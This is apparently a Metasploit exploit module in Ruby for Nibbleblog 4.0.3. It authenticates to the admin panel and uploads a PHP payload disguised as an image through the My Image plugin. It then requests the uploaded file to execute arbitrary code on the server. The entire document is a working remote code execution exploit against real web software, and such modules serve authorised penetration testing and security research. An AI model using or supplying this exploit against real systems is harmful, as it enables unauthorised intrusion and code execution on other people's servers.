# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;            => &#039;Nibbleblog File Upload Vulnerability&#039;,
      &#039;Description&#039;     => %q{
          Nibbleblog contains a flaw that allows a authenticated remote
          attacker to execute arbitrary PHP code. This module was
          tested on version 4.0.3.
        },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Unknown&#039;, # Vulnerability Disclosure - Curesec Research Team. Author&#039;s name?
        ],
      &#039;References&#039;      =>
        [
          [&#039;URL&#039;, &#039;http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Sep 01 2015&#039;,
      &#039;Platform&#039;        => &#039;php&#039;,
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [[&#039;Nibbleblog 4.0.3&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0
    ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;,  [true, &#039;The base path to the web application&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;,   [true, &#039;The username to authenticate with&#039;]),
        OptString.new(&#039;PASSWORD&#039;,   [true, &#039;The password to authenticate with&#039;])
      ], self.class)
  end
 
  def username
    datastore[&#039;USERNAME&#039;]
  end
 
  def password
    datastore[&#039;PASSWORD&#039;]
  end
 
  def check
    cookie = do_login(username, password)
    return Exploit::CheckCode::Detected unless cookie
 
    res = send_request_cgi(
      &#039;method&#039;      => &#039;GET&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path, &#039;admin.php&#039;),
      &#039;cookie&#039;      => cookie,
      &#039;vars_get&#039;    => {
        &#039;controller&#039;  => &#039;settings&#039;,
        &#039;action&#039;      => &#039;general&#039;
      }
    )
 
    if res && res.code == 200 && res.body.include?(&#039;Nibbleblog 4.0.3 "Coffee"&#039;)
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end
 
  def do_login(user, pass)
    res = send_request_cgi(
      &#039;method&#039;      => &#039;GET&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path, &#039;admin.php&#039;)
    )
 
    fail_with(Failure::Unreachable, &#039;No response received from the target.&#039;) unless res
 
    session_cookie = res.get_cookies
    vprint_status("#{peer} - Logging in...")
    res = send_request_cgi(
      &#039;method&#039;      => &#039;POST&#039;,
      &#039;uri&#039;         => normalize_uri(target_uri.path, &#039;admin.php&#039;),
      &#039;cookie&#039;      => session_cookie,
      &#039;vars_post&#039;   => {
        &#039;username&#039;  => user,
        &#039;password&#039;  => pass
      }
    )
 
    return session_cookie if res && res.code == 302 && res.headers[&#039;Location&#039;]
    nil
  end
 
  def exploit
    unless [ Exploit::CheckCode::Detected, Exploit::CheckCode::Appears ].include?(check)
      print_error("Target does not appear to be vulnerable.")
      return
    end
 
    vprint_status("#{peer} - Authenticating using #{username}:#{password}")
 
    cookie = do_login(username, password)
    fail_with(Failure::NoAccess, &#039;Unable to login. Verify USERNAME/PASSWORD or TARGETURI.&#039;) if cookie.nil?
    vprint_good("#{peer} - Authenticated with Nibbleblog.")
 
    vprint_status("#{peer} - Preparing payload...")
    payload_name = "#{Rex::Text.rand_text_alpha_lower(10)}.php"
 
    data = Rex::MIME::Message.new
    data.add_part(&#039;my_image&#039;, nil, nil, &#039;form-data; name="plugin"&#039;)
    data.add_part(&#039;My image&#039;, nil, nil, &#039;form-data; name="title"&#039;)
    data.add_part(&#039;4&#039;, nil, nil, &#039;form-data; name="position"&#039;)
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="caption"&#039;)
    data.add_part(payload.encoded, &#039;application/x-php&#039;, nil, "form-data; name=\"image\"; filename=\"#{payload_name}\"")
    data.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="image_resize"&#039;)
    data.add_part(&#039;230&#039;, nil, nil, &#039;form-data; name="image_width"&#039;)
    data.add_part(&#039;200&#039;, nil, nil, &#039;form-data; name="image_height"&#039;)
    data.add_part(&#039;auto&#039;, nil, nil, &#039;form-data; name="image_option"&#039;)
    post_data = data.to_s
 
    vprint_status("#{peer} - Uploading payload...")
    res = send_request_cgi(
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;uri&#039;           => normalize_uri(target_uri, &#039;admin.php&#039;),
      &#039;vars_get&#039;      => {
        &#039;controller&#039;  => &#039;plugins&#039;,
        &#039;action&#039;      => &#039;config&#039;,
        &#039;plugin&#039;      => &#039;my_image&#039;
      },
      &#039;ctype&#039;         => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;          => post_data,
      &#039;cookie&#039;        => cookie
    )
 
    if res && /Call to a member function getChild\(\) on a non\-object/ === res.body
      fail_with(Failure::Unknown, &#039;Unable to upload payload. Does the server have the My Image plugin installed?&#039;)
    elsif res && !( res.body.include?(&#039;<b>Warning</b>&#039;) || res.body.include?(&#039;warn&#039;) )
      fail_with(Failure::Unknown, &#039;Unable to upload payload.&#039;)
    end
 
    vprint_good("#{peer} - Uploaded the payload.")
 
    php_fname = &#039;image.php&#039;
    payload_url = normalize_uri(target_uri.path, &#039;content&#039;, &#039;private&#039;, &#039;plugins&#039;, &#039;my_image&#039;, php_fname)
    vprint_status("#{peer} - Parsed response.")
 
    register_files_for_cleanup(php_fname)
    vprint_status("#{peer} - Executing the payload at #{payload_url}.")
    send_request_cgi(
      &#039;uri&#039;     => payload_url,
      &#039;method&#039;  => &#039;GET&#039;
    )
  end
end

